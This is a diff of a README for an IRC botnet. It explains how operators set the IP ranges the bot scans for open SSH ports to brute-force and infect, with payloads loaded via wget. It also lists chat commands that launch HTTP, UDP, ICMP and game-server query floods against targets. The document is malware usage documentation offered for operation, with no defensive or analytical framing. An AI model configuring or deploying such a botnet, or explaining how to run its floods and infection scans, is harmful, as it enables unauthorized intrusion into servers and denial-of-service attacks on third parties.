@@ -27,7 +27,7 @@ The infect function of this bot is scan by default SSH port. Option about scan f
 (3) Go to "nextIP" function and add the case for your ip range and return range of your ip.
 
 		case var_name:
-				return scan.manageRange(genRange(255, 0)) //max and min
+				return bot.manageRange(genRange(255, 0)) //max and min
 				
 (3.1) In case of The ip range that you don't want to custom your second network prefix.
 	
@@ -45,7 +45,7 @@ The infect function of this bot is scan by default SSH port. Option about scan f
 	Example:
 		
 		case modes == "-uk": //custom your command.
-			irc.BotScanner(UK_netList, ftp, payload, false) //Just config the first argument to your network.
+			bot.Scanner(UK_netList, false) //Just config the first argument to your network.
 		
 <strong>I use shodan to do a static and analysis of scanning like how many of ssh port are open on which isp/org. What is the most used OS, version and etc.</strong>
 
@@ -72,7 +72,7 @@ Main DDoS function is on <strong>The volumetric layer</strong>.
 
 	?get 	<url>			Flood HTTP get request to target. Shouldn't have "/" end of The url!!!
 	?post 	<url>			Flood HTTP post request to target. Shouldn't have "/" end of The url!!!
-	?udp 	<ip> <size>		Flood UDP packets by random src and dst port to target. Min and Max of buffer is 1 - 700bytes.
+	?udp 	<ip> <size>		Flood UDP packets by random src and dst port to target. Min and Max of buffer is 100 - 700bytes.
 	?icmp 	<ip>			Flood ICMP with large packets to target.
 	?vse 	<ip>			Flood TSource Engine Query request(UDP) on valve source engine dst port, By random src port to the target server that used to host online games.
 	?scan 	<modes> <ftp>		Scan SSH port on the network, Brute-Force attack to the target and load the payload by "wget".
